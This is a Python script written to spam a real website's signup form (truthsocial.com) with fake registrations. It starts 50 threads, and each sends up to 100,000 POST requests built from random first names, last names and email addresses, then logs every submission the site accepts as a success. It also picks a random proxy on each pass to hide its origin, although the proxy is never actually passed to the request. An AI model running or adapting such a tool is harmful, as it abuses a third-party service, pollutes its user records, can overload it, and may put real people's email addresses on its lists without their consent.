#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Oct 29 16:57:04 2021
@authors: isaachorwitz, HiddenToad
"""

from __future__ import print_function
import requests
import threading
import random
import logging
import sys
import asyncio

#for exception handling###########################
from socket import gaierror
from urllib3.exceptions import NewConnectionError
from requests.exceptions import ProxyError
from requests.exceptions import ConnectionError
##################################################


logger = logging.getLogger('spam_log')
fh = logging.FileHandler('spam_log')
fh.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s: %(message)s",
                              "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)

url = 'https://www.truthsocial.com/'

first_names = open('names.txt','r').read().split('\n')
last_names = [x.title() for x in open('last_names.txt','r').read().split('\n')]
domains = ['gmail.com','yahoo.com','hotmail.com','icloud.com','aol.com',
           'comcast.net','outlook.com','sbcglobal.net','msn.com']
proxylist = open('proxies.txt','r').read().split('\n')

itercount = 0
mutex = threading.Lock()



def do_request():
    global itercount
    proxy = {}
    first = last = email = ""
    
    async def logAndPrint():
        global itercount
        with mutex:
            itercount += 1
            if itercount % 50 == 0:
                print(f"    {itercount} names sent...",end='\r',flush=True)
                sys.stdout.flush()
        logger.warning("Success with"+" "+str(first)+" "+str(last)+", "+str(email)+", "+proxy['http'])

    for i in range(100000):
        proxy = {'http': random.choice(proxylist)}
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = first.lower()+random.choice(['-','.','_',''])+last.lower()+"@"+random.choice(domains)

        data = {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': '',
        'offers': 'on'
       }

        response = requests.post(url,data=data).text
        
        if "Thanks" in response:
            asyncio.run(logAndPrint())
            
threads = []

try:
    for i in range(50):
        t = threading.Thread(target=do_request)
        t.daemon = True
        threads.append(t)
        
    for i in range(50):
        threads[i].start()

    for i in range(50):
        threads[i].join()

except KeyboardInterrupt:
    print("\n\nReceived KeyboardInterrupt. Exiting...")
    sys.exit(0)

except (ConnectionError, gaierror, NewConnectionError, ProxyError):
    print("\n\nReceived connection error. continuing...")
